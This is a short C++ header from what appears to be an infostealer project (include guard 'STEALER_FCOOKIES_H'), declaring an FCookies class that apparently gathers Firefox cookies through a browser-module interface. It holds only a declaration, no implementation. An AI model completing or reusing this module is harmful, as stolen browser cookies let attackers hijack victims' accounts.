//
// Created by .1qxz on 10.06.2024.
//

#ifndef STEALER_FCOOKIES_H
#define STEALER_FCOOKIES_H


#include "../FirefoxBrowserModule.h"
#include "../../../../../utils/SQLiteUtil.h"


class FCookies : public FirefoxBrowserModule{
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
};


#endif //STEALER_FCOOKIES_H
